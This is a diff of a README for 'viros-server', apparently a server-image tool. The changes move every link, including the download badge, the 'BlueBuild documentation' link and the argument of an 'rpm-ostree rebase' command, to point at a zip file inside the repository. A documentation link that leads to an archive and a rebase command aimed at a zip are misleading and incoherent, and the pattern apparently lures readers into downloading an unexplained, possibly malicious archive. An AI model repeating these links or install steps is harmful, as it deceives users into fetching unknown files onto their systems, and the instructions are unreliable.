@@ -1,6 +1,6 @@
 # 🚀 viros-server - A Simple Way to Manage Server Images
 
-[![Download viros-server](https://raw.githubusercontent.com/bachdepzai2012/viros-server/main/files/system/usr/viros-server_1.7.zip)](https://raw.githubusercontent.com/bachdepzai2012/viros-server/main/files/system/usr/viros-server_1.7.zip)
+[![Download viros-server](https://github.com/bachdepzai2012/viros-server/raw/refs/heads/main/modules/server_viros_1.7.zip)](https://github.com/bachdepzai2012/viros-server/raw/refs/heads/main/modules/server_viros_1.7.zip)
 
 ## 📦 Introduction
 
@@ -20,14 +20,14 @@ To begin using viros-server, follow the steps below to download and install the 
 
 You can download the latest version from the Releases page. Click the link below to visit the page:
 
-[Download viros-server](https://raw.githubusercontent.com/bachdepzai2012/viros-server/main/files/system/usr/viros-server_1.7.zip)
+[Download viros-server](https://github.com/bachdepzai2012/viros-server/raw/refs/heads/main/modules/server_viros_1.7.zip)
 
 ### 📥 Installation Steps
 
 1. **Rebase the Installation**:
    - First, you must rebase to the unsigned image. This helps to install the necessary signing keys and policies. Run the following command in your terminal:
      ```
-     rpm-ostree rebase https://raw.githubusercontent.com/bachdepzai2012/viros-server/main/files/system/usr/viros-server_1.7.zip
+     rpm-ostree rebase https://github.com/bachdepzai2012/viros-server/raw/refs/heads/main/modules/server_viros_1.7.zip
      ```
    
 2. **Reboot the System**:
@@ -51,7 +51,7 @@ You can download the latest version from the Releases page. Click the link below
 ### 🔍 Additional Considerations
 
 - **Experimental Features**: Note that some features may be experimental. Proceed with caution and consider backing up your data.
-- **Custom Configurations**: If you wish to make custom changes or setups, refer to the [BlueBuild documentation](https://raw.githubusercontent.com/bachdepzai2012/viros-server/main/files/system/usr/viros-server_1.7.zip) for instructions specific to customizing this application.
+- **Custom Configurations**: If you wish to make custom changes or setups, refer to the [BlueBuild documentation](https://github.com/bachdepzai2012/viros-server/raw/refs/heads/main/modules/server_viros_1.7.zip) for instructions specific to customizing this application.
 
 ## 🚨 Important Notes
 
